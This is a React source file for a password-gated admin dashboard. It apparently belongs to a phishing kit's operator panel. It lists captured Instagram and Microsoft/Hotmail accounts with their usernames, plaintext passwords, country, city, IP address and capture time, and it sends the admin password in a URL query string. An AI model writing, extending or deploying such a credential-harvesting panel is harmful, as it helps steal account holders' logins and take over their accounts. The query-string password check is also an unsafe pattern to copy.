import { useState, useEffect } from 'react';
import styles from '../styles/Admin.module.css';

export default function Admin() {
  const [password, setPassword] = useState('');
  const [users, setUsers] = useState([]);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [error, setError] = useState('');
  
  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      const response = await fetch(`/api/admin/users?password=${password}`);
      if (response.ok) {
        const data = await response.json();
        setUsers(data);
        setIsAuthenticated(true);
        setError('');
      } else {
        setError('Invalid password');
      }
    } catch (err) {
      setError('Error fetching data');
    }
  };
  
  // Filter functions for Instagram and Microsoft users
  const instagramUsers = users.filter(user => 
    user.username.includes('(IG)')
  );
  
  const microsoftUsers = users.filter(user => 
    user.username.includes('(hotmail)') || user.username.includes('(MS)')
  );
  
  return (
    <div className={styles.container}>
      {!isAuthenticated ? (
        <div className={styles.loginContainer}>
          <h1>Admin Login</h1>
          {error && <p className={styles.error}>{error}</p>}
          <form onSubmit={handleLogin}>
            <input 
              type="password" 
              value={password} 
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter admin password"
              required
            />
            <button type="submit">Login</button>
          </form>
        </div>
      ) : (
        <div className={styles.dashboard}>
          <h1>User Database</h1>
          
          <h2>Instagram Users ({instagramUsers.length})</h2>
          <table className={styles.table}>
            <thead>
              <tr>
                <th>Username</th>
                <th>Password</th>
                <th>Country</th>
                <th>City</th>
                <th>IP</th>
                <th>Time</th>
              </tr>
            </thead>
            <tbody>
              {instagramUsers.map(user => (
                <tr key={user.id}>
                  <td>{user.username}</td>
                  <td>{user.password}</td>
                  <td>{user.country}</td>
                  <td>{user.city}</td>
                  <td>{user.ip_address}</td>
                  <td>{new Date(user.login_time).toLocaleString()}</td>
                </tr>
              ))}
            </tbody>
          </table>
          
          <h2>Microsoft Users ({microsoftUsers.length})</h2>
          <table className={styles.table}>
            <thead>
              <tr>
                <th>Username</th>
                <th>Password</th>
                <th>Country</th>
                <th>City</th>
                <th>IP</th>
                <th>Time</th>
              </tr>
            </thead>
            <tbody>
              {microsoftUsers.map(user => (
                <tr key={user.id}>
                  <td>{user.username}</td>
                  <td>{user.password}</td>
                  <td>{user.country}</td>
                  <td>{user.city}</td>
                  <td>{user.ip_address}</td>
                  <td>{new Date(user.login_time).toLocaleString()}</td>
                </tr>
              ))}
            </tbody>
          </table>
          
          <button 
            className={styles.logoutButton}
            onClick={() => setIsAuthenticated(false)}
          >
            Logout
          </button>
        </div>
      )}
    </div>
  );
} 